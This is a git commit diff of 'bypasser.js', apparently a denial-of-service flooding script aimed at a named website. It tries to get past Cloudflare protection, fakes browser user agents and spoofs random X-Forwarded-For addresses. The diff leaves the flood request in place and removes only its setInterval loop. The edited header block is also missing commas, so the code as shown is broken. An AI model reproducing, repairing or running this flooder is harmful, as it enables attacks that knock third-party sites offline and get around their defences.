51fe13e54ac06562affb1e0f74fd05eca57c86be
IBteesam <83177878+ibteesam@users.noreply.github.com>
2022-08-07 17:34:44 +0700

    Add files via upload

--- bypasser.js
+++ bypasser.js
@@ -1,6 +1,6 @@
-const randomstring = require("randomstring");
 const cloudflare = require("cloudflare-bypasser")
 const cf = new cloudflare();
+const randomstring = require("randomstring")
 const fakeUa = require("fake-useragent");
 var char = randomstring.generate({
 length:10,
@@ -13,24 +13,26 @@ charset:'abcdefghijklmnopqstuvwxyz0123456789'
 ipq = function ranip(){
 return Math.round(Math.random()*256)
 }
-var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
+
 function flood_req(){
+var ip = ipq()+'.'+ipq()+'.'+ipq()+'.'+ipq()
 var Array_method = ['HEAD',  'GET',  'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'DEL'];
 cf.request({
 method:Array_method,
 resolveWithFullResponse: true,
 headers:{
-'User-Agent': fakeUa(),
+'User-Agent': fakeUa()
 'Upgrade-Insecure-Requests': '1',
+'Connection':'Keep-Alive',
+'Keep-Alive': 'timeout=10,max=100'
 'Origin': 'http://' + char + '.com',
 'Referrer': 'http://google.com/' + char,
-'X-Forwarded-For': ip()
+'X-Forwarded-For': ip
 },
-url:"https://ufagoal168.co/"+"?"+charr
+url:"https://ufagoal168.co/"
 })
 
 }
-setInterval(()=>{flood_req()})
 process.on('uncaughtException', function (err) {
     // console.log(err);
 });
